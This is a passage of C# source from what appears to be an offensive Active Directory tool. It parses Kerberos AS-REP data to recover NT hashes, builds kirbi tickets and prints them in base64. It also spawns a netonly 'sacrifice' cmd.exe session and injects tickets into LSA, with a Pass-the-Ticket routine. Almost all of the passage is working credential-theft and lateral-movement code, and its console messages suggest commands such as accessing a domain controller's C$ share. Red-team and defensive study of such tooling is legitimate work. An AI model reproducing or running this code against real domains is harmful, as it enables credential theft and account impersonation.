            if (ntlmOffset < 0)
            {
                Console.WriteLine("[!] Could not find NTLM credential marker");
                DumpDataForAnalysis(data);
                return;
            }

            // NTLM_SUPPLEMENTAL_CREDENTIAL structure follows after the NDR headers
            // Structure: Version (4), Flags (4), LmPassword (16), NtPassword (16)
            // The credential data starts after the NTLM string and some NDR alignment

            // Search for the hash block (40 bytes: version + flags + LM + NT)
            // The hash block typically starts shortly after the NTLM string
            for (int searchStart = ntlmOffset + ntlmPattern.Length; searchStart < data.Length - 36; searchStart++)
            {
                // NTLM_SUPPLEMENTAL_CREDENTIAL has Version=0 and specific Flags
                uint version = BitConverter.ToUInt32(data, searchStart);
                uint flags = BitConverter.ToUInt32(data, searchStart + 4);

                // Version should be 0, Flags typically 0, 1, 2, or 3
                if (version == 0 && flags <= 3)
                {
                    byte[] lmHash = new byte[16];
                    byte[] ntHash = new byte[16];
                    Array.Copy(data, searchStart + 8, lmHash, 0, 16);
                    Array.Copy(data, searchStart + 24, ntHash, 0, 16);

                    // Validate: NT hash should not be all zeros (unless account has no password)
                    bool hasNtHash = !ntHash.All(b => b == 0);
                    bool lmIsEmpty = lmHash.All(b => b == 0);

                    // Accept if NT hash has some variation or LM is empty (modern Windows)
                    if (hasNtHash || lmIsEmpty)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"\n[+] NT Hash: {BitConverter.ToString(ntHash).Replace("-", "").ToLower()}");
                        Console.ResetColor();
                        _ntHashExtracted = true;
                        return;
                    }
                }
            }

            OutputHelper.Verbose("[*] Could not parse NTLM credentials with standard method");
            DumpDataForAnalysis(data);
        }

        private static void DumpDataForAnalysis(byte[] data)
        {
            OutputHelper.Verbose("[*] Full data dump for manual analysis:");
            for (int i = 0; i < data.Length; i += 16)
            {
                int len = Math.Min(16, data.Length - i);
                byte[] line = new byte[len];
                Array.Copy(data, i, line, 0, len);
                OutputHelper.Verbose($"    {i:X4}: {BitConverter.ToString(line).Replace("-", " ")}");
            }
        }

        private static bool ImportTgtToCache(byte[] asRep, byte[] sessionKey, string user, string domain)
        {
            OutputHelper.Verbose("[*] Exporting TGT (kirbi format)...");

            try
            {
                // First extract the ticket from AS-REP
                byte[] ticket = ExtractTicketFromAsRep(asRep);
                if (ticket == null || ticket.Length == 0)
                {
                    Console.WriteLine("[!] Could not extract ticket from AS-REP");
                    return false;
                }
                OutputHelper.Verbose($"[+] Extracted ticket ({ticket.Length} bytes)");

                // Build KRB-CRED structure (kirbi format)
                byte[] krbCred = BuildKrbCred(ticket, sessionKey, user, domain);
                OutputHelper.Verbose($"[+] Built KRB-CRED ({krbCred.Length} bytes)");

                // Save kirbi file
                string kirbiFile = $"{user}_{DateTime.Now:yyyyMMdd_HHmmss}.kirbi";
                File.WriteAllBytes(kirbiFile, krbCred);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] TGT saved: {kirbiFile}");
                Console.ResetColor();

                // Convert to base64 for Rubeus compatibility
                string krbCredBase64 = Convert.ToBase64String(krbCred);

                // Display the ticket in base64 format (always shown)
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n[+] Ticket (Base64):\n");
                Console.WriteLine($"      {krbCredBase64}");
                Console.ResetColor();

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error exporting TGT: {ex.Message}");
                if (ex.InnerException != null)
                    Console.WriteLine($"[!] Inner: {ex.InnerException.Message}");
                return false;
            }
        }

        private static void CreateSacrificeSessionAndImportTicket(byte[] krbCred, string user, string domain)
        {
            Console.WriteLine("\n[*] Creating sacrifice logon session...");

            try
            {
                // Create process with netonly logon (like Rubeus createnetonly)
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                PROCESS_INFORMATION pi;

                string commandLine = "C:\\Windows\\System32\\cmd.exe";

                // Use fake credentials - the LOGON_NETCREDENTIALS_ONLY flag means
                // the credentials are only used for network access, not local logon
                bool success = CreateProcessWithLogonW(
                    "YOURUSER",           // fake username
                    "YOURDOMAIN",         // fake domain
                    "YOURPASSWORD",       // fake password
                    LOGON_NETCREDENTIALS_ONLY,
                    null,
                    commandLine,
                    CREATE_NEW_CONSOLE,   // Create a new console window
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi);

                if (!success)
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine($"[!] CreateProcessWithLogonW failed: {error}");
                    return;
                }

                Console.WriteLine($"[+] Created new process: {commandLine}");
                Console.WriteLine($"[+] Process ID: {pi.dwProcessId}");

                // Get the LUID of the new process
                LUID luid = GetProcessLuid(pi.hProcess);
                Console.WriteLine($"[+] Logon Session LUID: 0x{luid.HighPart:X}:{luid.LowPart:X}");

                // Import ticket to the new session
                Console.WriteLine("[*] Importing TGT to the new logon session...");

                bool imported = ImportTicketToSession(krbCred, luid);

                if (imported)
                {
                    Console.WriteLine($"\n[+] SUCCESS! TGT imported to sacrifice session!");
                    Console.WriteLine($"[+] A new cmd.exe window has been opened with the {user}@{domain.ToUpper()} TGT");
                    Console.WriteLine($"[*] Use that window to access network resources as {user}");
                    Console.WriteLine($"[*] Example: dir \\\\dc01.{domain}\\c$");
                }
                else
                {
                    Console.WriteLine("[!] Failed to import ticket to the new session");
                    Console.WriteLine("[*] The cmd.exe window is still open but without the TGT");
                    Console.WriteLine($"[*] You can try manually in that window:");
                    Console.WriteLine($"    Rubeus.exe ptt /ticket:{user}_{DateTime.Now:yyyyMMdd}*.kirbi");
                }

                // Close handles
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error creating sacrifice session: {ex.Message}");
            }
        }

        private static LUID GetProcessLuid(IntPtr hProcess)
        {
            LUID luid = new LUID();

            try
            {
                IntPtr hToken;
                if (!OpenProcessToken(hProcess, TOKEN_QUERY, out hToken))
                {
                    Console.WriteLine($"[!] OpenProcessToken failed: {Marshal.GetLastWin32Error()}");
                    return luid;
                }

                try
                {
                    int tokenInfoLength = Marshal.SizeOf(typeof(TOKEN_STATISTICS));
                    IntPtr tokenInfo = Marshal.AllocHGlobal(tokenInfoLength);

                    try
                    {
                        int returnLength;
                        if (GetTokenInformation(hToken, TokenStatistics, tokenInfo, tokenInfoLength, out returnLength))
                        {
                            TOKEN_STATISTICS stats = (TOKEN_STATISTICS)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_STATISTICS));
                            luid = stats.AuthenticationId;
                        }
                        else
                        {
                            Console.WriteLine($"[!] GetTokenInformation failed: {Marshal.GetLastWin32Error()}");
                        }
                    }
                    finally
                    {
                        Marshal.FreeHGlobal(tokenInfo);
                    }
                }
                finally
                {
                    CloseHandle(hToken);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error getting LUID: {ex.Message}");
            }

            return luid;
        }

        private static bool ImportTicketToSession(byte[] krbCred, LUID targetLuid)
        {
            IntPtr lsaHandle = IntPtr.Zero;

            try
            {
                // We MUST use LsaRegisterLogonProcess to target a specific LUID
                // This requires SeTcbPrivilege (run as admin or SYSTEM)
                string processName = "SpicyAD";
                IntPtr processNamePtr = Marshal.StringToHGlobalAnsi(processName);
                LSA_STRING lsaProcessName = new LSA_STRING
                {
                    Length = (ushort)processName.Length,
                    MaximumLength = (ushort)(processName.Length + 1),
                    Buffer = processNamePtr
                };

                ulong securityMode;
                int ntstatus = LsaRegisterLogonProcess(ref lsaProcessName, out lsaHandle, out securityMode);
                Marshal.FreeHGlobal(processNamePtr);

                if (ntstatus != 0)
                {
                    Console.WriteLine($"[!] LsaRegisterLogonProcess failed: 0x{ntstatus:X8}");
                    Console.WriteLine("[!] This requires running as Administrator (elevated) or SYSTEM");
                    Console.WriteLine("[!] The sacrifice session cmd.exe is open but has no TGT");
                    Console.WriteLine($"[*] You can manually import using Rubeus:");
                    Console.WriteLine($"    Rubeus.exe ptt /luid:0x{targetLuid.HighPart:X}:{targetLuid.LowPart:X} /ticket:<base64>");
                    return false;
                }

                OutputHelper.Verbose("[+] Privileged LSA connection established");

                // Lookup Kerberos package
                string packageName = "Kerberos";
                IntPtr packageNamePtr2 = Marshal.StringToHGlobalAnsi(packageName);
                LSA_STRING lsaPackageName = new LSA_STRING
                {
                    Length = (ushort)packageName.Length,
                    MaximumLength = (ushort)(packageName.Length + 1),
                    Buffer = packageNamePtr2
                };

                int authPackage;
                ntstatus = LsaLookupAuthenticationPackage(lsaHandle, ref lsaPackageName, out authPackage);
                Marshal.FreeHGlobal(packageNamePtr2);

                if (ntstatus != 0)
                {
                    Console.WriteLine($"[!] LsaLookupAuthenticationPackage failed: 0x{ntstatus:X8}");
                    return false;
                }

                // Build KERB_SUBMIT_TKT_REQUEST
                // Structure:
                // - MessageType (DWORD) = KerbSubmitTicketMessage (21)
                // - LogonId (LUID) = target LUID
                // - Flags (DWORD) = 0
                // - Key (KERB_CRYPTO_KEY) = not used for KRB-CRED
                // - KerbCredSize (DWORD) = ticket size
                // - KerbCredOffset (DWORD) = offset to ticket data
                // - [ticket data follows]

                int baseSize = 4 + 8 + 4 + (4 + 4 + 4) + 4 + 4; // MessageType + LUID + Flags + Key + Size + Offset
                int totalSize = baseSize + krbCred.Length;

                IntPtr submitBuffer = Marshal.AllocHGlobal(totalSize);

                try
                {
                    // Zero out the buffer
                    for (int i = 0; i < totalSize; i++)
                        Marshal.WriteByte(submitBuffer, i, 0);

                    int offset = 0;

                    // MessageType = KerbSubmitTicketMessage (21)
                    Marshal.WriteInt32(submitBuffer, offset, KerbSubmitTicketMessage);
                    offset += 4;

                    // LogonId (LUID) - 8 bytes - target the sacrifice session
                    Marshal.WriteInt32(submitBuffer, offset, (int)targetLuid.LowPart);
                    Marshal.WriteInt32(submitBuffer, offset + 4, targetLuid.HighPart);
                    offset += 8;

                    // Flags = 0
                    Marshal.WriteInt32(submitBuffer, offset, 0);
                    offset += 4;

                    // Key.KeyType = 0
                    Marshal.WriteInt32(submitBuffer, offset, 0);
                    offset += 4;

                    // Key.Length = 0
                    Marshal.WriteInt32(submitBuffer, offset, 0);
                    offset += 4;

                    // Key.Value = NULL (offset from base)
                    Marshal.WriteInt32(submitBuffer, offset, 0);
                    offset += 4;

                    // KerbCredSize
                    Marshal.WriteInt32(submitBuffer, offset, krbCred.Length);
                    offset += 4;

                    // KerbCredOffset (offset from start of structure to ticket data)
                    Marshal.WriteInt32(submitBuffer, offset, baseSize);
                    offset += 4;

                    // Copy KRB-CRED data
                    Marshal.Copy(krbCred, 0, IntPtr.Add(submitBuffer, baseSize), krbCred.Length);

                    // Call LsaCallAuthenticationPackage
                    IntPtr returnBuffer;
                    int returnLength;
                    int protocolStatus;

                    ntstatus = LsaCallAuthenticationPackage(
                        lsaHandle,
                        authPackage,
                        submitBuffer,
                        totalSize,
                        out returnBuffer,
                        out returnLength,
                        out protocolStatus);

                    if (ntstatus != 0)
                    {
                        Console.WriteLine($"[!] LsaCallAuthenticationPackage failed: 0x{ntstatus:X8}");
                        return false;
                    }

                    if (protocolStatus != 0)
                    {
                        Console.WriteLine($"[!] Protocol status error: 0x{protocolStatus:X8}");
                        return false;
                    }

                    if (returnBuffer != IntPtr.Zero)
                        LsaFreeReturnBuffer(returnBuffer);

                    Console.WriteLine("[+] Ticket submitted successfully!");
                    return true;
                }
                finally
                {
                    Marshal.FreeHGlobal(submitBuffer);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error importing ticket: {ex.Message}");
                return false;
            }
            finally
            {
                if (lsaHandle != IntPtr.Zero)
                    LsaDeregisterLogonProcess(lsaHandle);
            }
        }

        private static byte[] ExtractTicketFromAsRep(byte[] asRep)
        {
            // AS-REP ticket is at tag [5]
            // AS-REP structure: [APPLICATION 11] SEQUENCE {
            //   pvno [0], msg-type [1], padata [2], crealm [3], cname [4], ticket [5], enc-part [6]
            // }

            int offset = 0;

            // Skip APPLICATION 11 tag (0x6B)
            if (asRep[offset] == 0x6B)
            {
                offset++;
                int len;
                offset += DecodeLength(asRep, offset, out len);
            }

            // Skip outer SEQUENCE
            if (asRep[offset] == 0x30)
            {
                offset++;
                int len;
                offset += DecodeLength(asRep, offset, out len);
            }

            // Now we're inside the SEQUENCE - parse each field
            int seqStart = offset;

            // Parse through fields [0], [1], [2], [3], [4] to get to [5]
            while (offset < asRep.Length - 10)
            {
                byte tag = asRep[offset];

                // Check if this is the ticket [5] tag
                if (tag == 0xA5)
                {
                    offset++; // skip tag
                    int ticketLen;
                    int lenBytes = DecodeLength(asRep, offset, out ticketLen);
                    offset += lenBytes;

                    // Now at ticket content - should be APPLICATION 1 (Ticket)
                    OutputHelper.Verbose($"[*] Found ticket [5] tag, length {ticketLen}");
                    OutputHelper.Verbose($"[*] Ticket content starts at offset {offset}, first byte: 0x{asRep[offset]:X2}");

                    if (asRep[offset] == 0x61) // APPLICATION 1 (Ticket)
                    {
                        byte[] ticketData = new byte[ticketLen];
                        Array.Copy(asRep, offset, ticketData, 0, ticketLen);
                        OutputHelper.Verbose($"[+] Ticket extracted (APPLICATION 1), {ticketLen} bytes");
                        return ticketData;
                    }

                    // If not APPLICATION 1, still try to extract
                    byte[] rawTicket = new byte[ticketLen];
                    Array.Copy(asRep, offset, rawTicket, 0, ticketLen);
                    return rawTicket;
                }

                // Skip this context tag to move to next field
                if ((tag & 0xE0) == 0xA0) // Context-specific constructed tag
                {
                    offset++; // skip tag
                    int fieldLen;
                    int lenBytes = DecodeLength(asRep, offset, out fieldLen);
                    offset += lenBytes;
                    offset += fieldLen; // skip field content
                }
                else
                {
                    // Unknown structure, advance by 1
                    offset++;
                }
            }

            Console.WriteLine("[!] Could not find ticket [5] in AS-REP");
            return null;
        }

        private static byte[] BuildKrbCred(byte[] ticket, byte[] sessionKey, string user, string domain)
        {
            // KRB-CRED ::= [APPLICATION 22] SEQUENCE {
            //   pvno       [0] INTEGER (5),
            //   msg-type   [1] INTEGER (22),
            //   tickets    [2] SEQUENCE OF Ticket,
            //   enc-part   [3] EncryptedData (EncKrbCredPart encrypted with null key)
            // }

            string realm = domain.ToUpper();

            // Build EncKrbCredPart with ticket info (encrypted with null key for import)
            byte[] encKrbCredPart = BuildEncKrbCredPart(sessionKey, user, realm);

            // Wrap in EncryptedData with etype=0 (null encryption)
            List<byte> encryptedData = new List<byte>();
            encryptedData.AddRange(BuildContextTag(0, BuildInteger(0))); // etype = 0 (null)
            encryptedData.AddRange(BuildContextTag(2, BuildOctetString(encKrbCredPart))); // cipher
            byte[] encPartSeq = BuildSequence(encryptedData.ToArray());

            // Build KRB-CRED
            List<byte> krbCredContent = new List<byte>();
            krbCredContent.AddRange(BuildContextTag(0, BuildInteger(5))); // pvno
            krbCredContent.AddRange(BuildContextTag(1, BuildInteger(22))); // msg-type
            krbCredContent.AddRange(BuildContextTag(2, BuildSequence(ticket))); // tickets
            krbCredContent.AddRange(BuildContextTag(3, encPartSeq)); // enc-part

            byte[] krbCredSeq = BuildSequence(krbCredContent.ToArray());
            byte[] krbCred = BuildApplication(22, krbCredSeq);

            return krbCred;
        }

        private static byte[] BuildEncKrbCredPart(byte[] sessionKey, string user, string realm)
        {
            // EncKrbCredPart ::= [APPLICATION 29] SEQUENCE {
            //   ticket-info   [0] SEQUENCE OF KrbCredInfo,
            //   nonce         [1] UInt32 OPTIONAL,
            //   timestamp     [2] KerberosTime OPTIONAL,
            //   usec          [3] Microseconds OPTIONAL,
            //   s-address     [4] HostAddress OPTIONAL,
            //   r-address     [5] HostAddress OPTIONAL
            // }
            // KrbCredInfo ::= SEQUENCE {
            //   key           [0] EncryptionKey,
            //   prealm        [1] Realm OPTIONAL,
            //   pname         [2] PrincipalName OPTIONAL,
            //   flags         [3] TicketFlags OPTIONAL,
            //   authtime      [4] KerberosTime OPTIONAL,
            //   starttime     [5] KerberosTime OPTIONAL,
            //   endtime       [6] KerberosTime OPTIONAL,
            //   renew-till    [7] KerberosTime OPTIONAL,
            //   srealm        [8] Realm OPTIONAL,
            //   sname         [9] PrincipalName OPTIONAL
            // }

            // Build EncryptionKey
            // EncryptionKey ::= SEQUENCE { keytype [0] Int32, keyvalue [1] OCTET STRING }
            // Use AES256 (18) since that's what Windows KDC typically uses
            List<byte> encKey = new List<byte>();
            encKey.AddRange(BuildContextTag(0, BuildInteger(ETYPE_AES256_CTS_HMAC_SHA1)));
            encKey.AddRange(BuildContextTag(1, BuildOctetString(sessionKey)));
            byte[] encKeySeq = BuildSequence(encKey.ToArray());

            string timeNow = DateTime.UtcNow.ToString("yyyyMMddHHmmss") + "Z";
            string endTime = DateTime.UtcNow.AddHours(10).ToString("yyyyMMddHHmmss") + "Z";
            string renewTill = DateTime.UtcNow.AddDays(7).ToString("yyyyMMddHHmmss") + "Z";

            // Build KrbCredInfo
            List<byte> credInfo = new List<byte>();
            credInfo.AddRange(BuildContextTag(0, encKeySeq)); // key
            credInfo.AddRange(BuildContextTag(1, BuildGeneralString(realm))); // prealm
            credInfo.AddRange(BuildContextTag(2, BuildPrincipalName(1, user))); // pname (NT-PRINCIPAL)

            // flags [3] - forwardable, renewable, initial, pre-authent
            byte[] flags = new byte[] { 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10 };
            credInfo.AddRange(BuildContextTag(3, flags));

            credInfo.AddRange(BuildContextTag(4, BuildGeneralizedTime(timeNow))); // authtime
            credInfo.AddRange(BuildContextTag(5, BuildGeneralizedTime(timeNow))); // starttime
            credInfo.AddRange(BuildContextTag(6, BuildGeneralizedTime(endTime))); // endtime
            credInfo.AddRange(BuildContextTag(7, BuildGeneralizedTime(renewTill))); // renew-till
            credInfo.AddRange(BuildContextTag(8, BuildGeneralString(realm))); // srealm
            credInfo.AddRange(BuildContextTag(9, BuildPrincipalName(2, "krbtgt", realm))); // sname

            byte[] credInfoSeq = BuildSequence(credInfo.ToArray());

            // Build ticket-info sequence
            byte[] ticketInfo = BuildSequence(credInfoSeq);

            // Build EncKrbCredPart
            List<byte> encKrbCredPartContent = new List<byte>();
            encKrbCredPartContent.AddRange(BuildContextTag(0, ticketInfo));

            byte[] encKrbCredPartSeq = BuildSequence(encKrbCredPartContent.ToArray());
            return BuildApplication(29, encKrbCredPartSeq);
        }

        private static bool SubmitTicketViaLsa(byte[] krbCred)
        {
            OutputHelper.Verbose("[*] Submitting ticket via LSA...");

            IntPtr lsaHandle = IntPtr.Zero;

            try
            {
                // Connect to LSA
                int ntstatus = LsaConnectUntrusted(out lsaHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine($"[!] LsaConnectUntrusted failed: 0x{ntstatus:X8}");
                    return false;
                }
                OutputHelper.Verbose("[+] Connected to LSA");

                // Lookup Kerberos package
                string packageName = "Kerberos";
                IntPtr packageNamePtr = Marshal.StringToHGlobalAnsi(packageName);
                LSA_STRING lsaPackageName = new LSA_STRING
                {
                    Length = (ushort)packageName.Length,
                    MaximumLength = (ushort)(packageName.Length + 1),
                    Buffer = packageNamePtr
                };

                int authPackage;
                ntstatus = LsaLookupAuthenticationPackage(lsaHandle, ref lsaPackageName, out authPackage);
                Marshal.FreeHGlobal(packageNamePtr);

                if (ntstatus != 0)
                {
                    Console.WriteLine($"[!] LsaLookupAuthenticationPackage failed: 0x{ntstatus:X8}");
                    return false;
                }
                OutputHelper.Verbose($"[+] Kerberos package ID: {authPackage}");

                // Build KERB_SUBMIT_TKT_REQUEST
                // struct KERB_SUBMIT_TKT_REQUEST {
                //   KERB_PROTOCOL_MESSAGE_TYPE MessageType; // 4 bytes
                //   LUID LogonId;                           // 8 bytes
                //   ULONG Flags;                            // 4 bytes
                //   KERB_CRYPTO_KEY32 Key;                  // 12 bytes (KeyType:4 + Length:4 + Offset:4)
                //   ULONG KerbCredSize;                     // 4 bytes
                //   ULONG KerbCredOffset;                   // 4 bytes
                // } Total header: 36 bytes

                const int HEADER_SIZE = 36;
                int requestSize = HEADER_SIZE + krbCred.Length;
                byte[] requestBuffer = new byte[requestSize];

                int offset = 0;

                // MessageType = KerbSubmitTicketMessage (21)
                Array.Copy(BitConverter.GetBytes(KerbSubmitTicketMessage), 0, requestBuffer, offset, 4);
                offset += 4;

                // LogonId (LUID) - zero for current session
                offset += 8;

                // Flags - 0
                offset += 4;

                // Key - KERB_CRYPTO_KEY32 (KeyType:4, Length:4, Offset:4 = 12 bytes)
                // Not used for PTT, just zeros
                offset += 12;

                // KerbCredSize
                Array.Copy(BitConverter.GetBytes(krbCred.Length), 0, requestBuffer, offset, 4);
                offset += 4;

                // KerbCredOffset (offset from start of struct = HEADER_SIZE)
                Array.Copy(BitConverter.GetBytes(HEADER_SIZE), 0, requestBuffer, offset, 4);
                offset += 4;

                // KrbCred data
                Array.Copy(krbCred, 0, requestBuffer, offset, krbCred.Length);

                OutputHelper.Verbose($"[*] Request buffer: header={HEADER_SIZE}, krbCred={krbCred.Length}");

                IntPtr submitBuffer = Marshal.AllocHGlobal(requestBuffer.Length);
                Marshal.Copy(requestBuffer, 0, submitBuffer, requestBuffer.Length);

                IntPtr returnBuffer;
                int returnBufferLength;
                int protocolStatus;

                ntstatus = LsaCallAuthenticationPackage(
                    lsaHandle,
                    authPackage,
                    submitBuffer,
                    requestBuffer.Length,
                    out returnBuffer,
                    out returnBufferLength,
                    out protocolStatus);

                Marshal.FreeHGlobal(submitBuffer);

                if (ntstatus != 0)
                {
                    Console.WriteLine($"[!] LsaCallAuthenticationPackage failed: NTSTATUS=0x{ntstatus:X8}");
                    return false;
                }

                if (protocolStatus != 0)
                {
                    Console.WriteLine($"[!] Protocol status: 0x{protocolStatus:X8}");
                    // Some status codes are warnings/info, not errors
                    if ((protocolStatus & 0xC0000000) == 0xC0000000)
                    {
                        Console.WriteLine("[!] Ticket submission may have failed");
                        return false;
                    }
                }

                OutputHelper.Verbose("[+] Ticket submitted to LSA successfully!");

                if (returnBuffer != IntPtr.Zero)
                    LsaFreeReturnBuffer(returnBuffer);

                return true;
            }
            finally
            {
                if (lsaHandle != IntPtr.Zero)
                    LsaDeregisterLogonProcess(lsaHandle);
            }
        }

        private static void SaveAsRepToFile(byte[] asRep, string user)
        {
            try
            {
                string filename = $"{user}_AS-REP_{DateTime.Now:yyyyMMdd_HHmmss}.bin";
                File.WriteAllBytes(filename, asRep);
                OutputHelper.Verbose($"[+] Raw AS-REP saved to: {filename}");
                OutputHelper.Verbose($"[*] AS-REP size: {asRep.Length} bytes");

                // Also hex dump first 128 bytes for debugging
                OutputHelper.Verbose("[*] First 128 bytes of AS-REP:");
                for (int i = 0; i < Math.Min(128, asRep.Length); i += 16)
                {
                    StringBuilder hex = new StringBuilder();
                    StringBuilder ascii = new StringBuilder();
                    for (int j = 0; j < 16 && i + j < asRep.Length; j++)
                    {
                        hex.Append($"{asRep[i + j]:X2} ");
                        ascii.Append(asRep[i + j] >= 32 && asRep[i + j] < 127 ? (char)asRep[i + j] : '.');
                    }
                    OutputHelper.Verbose($"    {i:X4}: {hex,-48} {ascii}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error saving AS-REP: {ex.Message}");
            }
        }

        private static void ParseKrbError(byte[] data)
        {
            try
            {
                // Find error-code in the response
                // error-code is usually tagged with [6]
                for (int i = 0; i < data.Length - 5; i++)
                {
                    if (data[i] == 0xA6 && data[i + 1] == 0x03 && data[i + 2] == 0x02)
                    {
                        int errorCode = data[i + 4];
                        Console.WriteLine($"[!] Kerberos Error Code: {errorCode} ({GetKrbErrorName(errorCode)})");
                        return;
                    }
                }

                // Try to find e-text
                Console.WriteLine("[!] Could not parse error code");
            }
            catch { }
        }

        private static string GetKrbErrorName(int code)
        {
            switch (code)
            {
                case 3: return "KDC_ERR_BAD_PVNO";
                case 4: return "KDC_ERR_C_OLD_MAST_KVNO";
                case 5: return "KDC_ERR_S_OLD_MAST_KVNO";
                case 6: return "KDC_ERR_C_PRINCIPAL_UNKNOWN";
                case 7: return "KDC_ERR_S_PRINCIPAL_UNKNOWN";
                case 12: return "KDC_ERR_POLICY";
                case 13: return "KDC_ERR_BADOPTION";
                case 14: return "KDC_ERR_ETYPE_NOSUPP";
                case 17: return "KDC_ERR_KEY_EXPIRED";
                case 18: return "KDC_ERR_CLIENT_REVOKED";
                case 24: return "KDC_ERR_PREAUTH_FAILED";
                case 25: return "KDC_ERR_PREAUTH_REQUIRED";
                case 31: return "KDC_ERR_REQUEST_MALFORMED";
                case 37: return "KDC_ERR_S_PRINCIPAL_UNKNOWN";
                case 41: return "KDC_ERR_CLIENT_NOT_TRUSTED (PKINIT: certificate validation failed)";
                case 42: return "KDC_ERR_INVALID_SIG (PKINIT: signature validation failed)";
                case 43: return "KDC_ERR_DH_KEY_PARAMETERS_NOT_ACCEPTED";
                case 44: return "KDC_ERR_WRONG_REALM";
                case 45: return "KDC_ERR_PREAUTH_EXPIRED";
                case 60: return "KDC_ERR_GENERIC (Strong Certificate Mapping required - use /sid flag)";
                case 68: return "KDC_ERR_WRONG_REALM";
                case 69: return "KDC_ERR_CLIENT_NAME_MISMATCH";
                case 70: return "KDC_ERR_KDC_NAME_MISMATCH";
                default: return $"Unknown ({code})";
            }
        }

        private static void ExtractTgtInfo(byte[] response, string user, string domain)
        {
            OutputHelper.Verbose($"\n[+] TGT Info:");
            Console.WriteLine($"    User: {user}@{domain.ToUpper()}");
            OutputHelper.Verbose($"    Service: krbtgt/{domain.ToUpper()}");

            // Try to extract ticket validity times
            // This is a simplified parser
            OutputHelper.Verbose($"    Response Size: {response.Length} bytes");
        }

        // ASN.1 DER encoding helpers
        private static byte[] BuildInteger(int value)
        {
            if (value < 128)
            {
                return new byte[] { 0x02, 0x01, (byte)value };
            }
            else if (value < 32768)
            {
                return new byte[] { 0x02, 0x02, (byte)(value >> 8), (byte)(value & 0xFF) };
            }
            else
            {
                byte[] valBytes = BitConverter.GetBytes(value);
                if (BitConverter.IsLittleEndian)
                    Array.Reverse(valBytes);

                // Remove leading zeros
                int start = 0;
                while (start < valBytes.Length - 1 && valBytes[start] == 0) start++;

                byte[] result = new byte[valBytes.Length - start + 2];
                result[0] = 0x02;
                result[1] = (byte)(valBytes.Length - start);
                Array.Copy(valBytes, start, result, 2, valBytes.Length - start);
                return result;
            }
        }

        private static byte[] BuildOctetString(byte[] data)
        {
            List<byte> result = new List<byte>();
            result.Add(0x04);
            result.AddRange(EncodeLength(data.Length));
            result.AddRange(data);
            return result.ToArray();
        }

        private static byte[] BuildGeneralString(string s)
        {
            byte[] strBytes = Encoding.ASCII.GetBytes(s);
            List<byte> result = new List<byte>();
            result.Add(0x1B); // GeneralString tag
            result.AddRange(EncodeLength(strBytes.Length));
            result.AddRange(strBytes);
            return result.ToArray();
        }

        private static byte[] BuildGeneralizedTime(string time)
        {
            byte[] timeBytes = Encoding.ASCII.GetBytes(time);
            List<byte> result = new List<byte>();
            result.Add(0x18); // GeneralizedTime tag
            result.AddRange(EncodeLength(timeBytes.Length));
            result.AddRange(timeBytes);
            return result.ToArray();
        }

        private static byte[] BuildSequence(params byte[][] items)
        {
            List<byte> content = new List<byte>();
            foreach (byte[] item in items)
            {
                content.AddRange(item);
            }
            return BuildSequence(content.ToArray());
        }

        private static byte[] BuildSequence(byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add(0x30); // SEQUENCE tag
            result.AddRange(EncodeLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] BuildSet(byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add(0x31); // SET tag
            result.AddRange(EncodeLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] BuildContextTag(int tag, byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add((byte)(0xA0 | tag)); // Context-specific constructed
            result.AddRange(EncodeLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] BuildApplication(int tag, byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add((byte)(0x60 | tag)); // Application constructed
            result.AddRange(EncodeLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] EncodeLength(int length)
        {
            if (length < 128)
            {
                return new byte[] { (byte)length };
            }
            else if (length < 256)
            {
                return new byte[] { 0x81, (byte)length };
            }
            else if (length < 65536)
            {
                return new byte[] { 0x82, (byte)(length >> 8), (byte)(length & 0xFF) };
            }
            else
            {
                return new byte[] { 0x83, (byte)(length >> 16), (byte)((length >> 8) & 0xFF), (byte)(length & 0xFF) };
            }
        }

        
        /// Pass-the-Ticket: Import a .kirbi ticket into current session
        /// Accepts either a file path or base64-encoded ticket

        public static bool PassTheTicket(string ticketInput)
        {
            try
            {
                byte[] ticketBytes;

                // Check if input is a file path
                if (File.Exists(ticketInput))
                {
                    Console.WriteLine($"[*] Pass-the-Ticket: {ticketInput}\n");
                    ticketBytes = File.ReadAllBytes(ticketInput);
                    Console.WriteLine($"[*] Loaded ticket from file: {ticketBytes.Length} bytes");
                }
                else
                {
                    // Try to decode as base64
                    try
                    {
                        ticketBytes = Convert.FromBase64String(ticketInput);
                        Console.WriteLine($"[*] Pass-the-Ticket: <base64 input>\n");
                        Console.WriteLine($"[*] Decoded ticket from base64: {ticketBytes.Length} bytes");
                    }
                    catch (FormatException)
                    {
                        Console.WriteLine($"[!] File not found and input is not valid base64: {ticketInput}");
                        return false;
                    }
                }

                // Import to current session
                return ImportTicketToCurrentSession(ticketBytes);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                return false;
            }
        }

        
        /// Import ticket to current logon session
        
        private static bool ImportTicketToCurrentSession(byte[] ticketBytes)
        {
            IntPtr lsaHandle = IntPtr.Zero;

            try
            {
                // Connect to LSA (untrusted connection for current session)
                int ntstatus = LsaConnectUntrusted(out lsaHandle);
                if (ntstatus != 0)
                {
